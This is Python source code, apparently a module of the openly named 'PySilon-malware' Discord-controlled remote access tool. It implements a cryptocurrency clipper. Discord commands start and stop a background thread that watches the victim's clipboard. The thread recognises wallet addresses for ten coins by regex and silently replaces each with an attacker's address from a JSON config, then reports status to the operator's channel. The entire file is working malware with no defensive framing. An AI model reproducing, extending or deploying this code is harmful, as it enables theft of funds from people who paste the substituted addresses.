import pyperclip
import re
import os
import json
import threading
# end of imports
# on message
elif message.content == '.start-clipper':
    #.log Message is "start crypto clipper" 
    if clipper_stop:
        #.log Clipper is not running 
        await message.delete()
        #.log Removed the message 
        clipper_stop = False
        script_dir = os.path.dirname(os.path.abspath(__file__))
        #.log Fetched the script directory 
        config_path = os.path.join(script_dir, 'crypto_clipper.json')
        #.log Fetched the configuration path 
        with open(config_path) as f:
            addresses = json.load(f)
        #.log Fetched the configuration 
        def match():
            clipboard = str(pyperclip.paste())
            #.log Fetched the clipboard content 
            btc_match = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", clipboard)
            eth_match = re.match("^0x[a-zA-F0-9]{40}$", clipboard)
            doge_match = re.match("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$", clipboard)
            ltc_match = re.match("^([LM3]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}||ltc1[a-z0-9]{39,59})$", clipboard)
            xmr_match = re.match("^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$", clipboard)
            bch_match = re.match("^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$", clipboard)
            dash_match = re.match("^X[1-9A-HJ-NP-Za-km-z]{33}$", clipboard)
            trx_match = re.match("^T[A-Za-z1-9]{33}$", clipboard)
            xrp_match = re.match("^r[0-9a-zA-Z]{33}$", clipboard)
            xlm_match = re.match("^G[0-9A-Z]{40,60}$", clipboard)
            #.log Tried to match address RegEx 
            for currency, address in addresses.items():
                if eval(f'{currency.lower()}_match'):
                    if address and address != clipboard:
                        #.log Matched address with crypto RegEx 
                        pyperclip.copy(address)
                        #.log Switched the copied address into other one 
                    break
        def wait_for_paste():
            while not clipper_stop:
                pyperclip.waitForNewPaste()
                #.log New text copied 
                match()
        thread = threading.Thread(target=wait_for_paste)
        #.log Created the Clipper thread 
        thread.start()
        #.log Started the Clipper 
        embed = discord.Embed(title="🟢 Crypto Clipper started!",description=f'```Crypto Clipper has been started! Stop it by using .stop-clipper```', colour=discord.Colour.green())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)
        #.log Sent embed about Clipper startup 
    else:
        #.log Clipper is already running 
        await message.delete()
        #.log Removed the message 
        embed = discord.Embed(title="🔴 Hold on!",description=f'```Crypto Clipper is already running! Stop it by using .stop-clipper```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)
        #.log Sent embed about Clipper already running 
# on message
elif message.content == '.stop-clipper':
    #.log Message is "stop crypto clipper" 
    await message.delete()
    #.log Removed the message 
    if not clipper_stop:
        #.log Clipper is running 
        thread.join()
        #.log Stopped Clipper 
        embed = discord.Embed(title="🔴 Crypto Clipper stopped!",description=f'```Crypto Clipper has been stopped! Start it using .start-clipper```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)
        #.log Sent embed about Clipper stopped 
        clipper_stop = True
    else:
        #.log Clipper is not running 
        embed = discord.Embed(title="🔴 Hold on!",description=f'```Crypto Clipper is not running! Start it using .start-clipper```', colour=discord.Colour.red())
        embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
        await message.channel.send(embed=embed)
        #.log Sent embed about Clipper not running 
